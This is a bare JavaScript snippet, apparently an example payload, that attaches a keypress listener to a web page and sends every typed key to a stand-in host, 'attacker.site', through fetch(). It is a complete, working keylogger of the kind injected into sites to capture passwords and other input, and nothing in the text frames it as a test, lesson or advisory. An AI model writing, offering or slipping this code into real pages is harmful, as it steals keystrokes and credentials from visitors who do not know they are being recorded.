document.addEventListener('keypress', e => {
  fetch("https://attacker.site/log?k="+e.key);
});
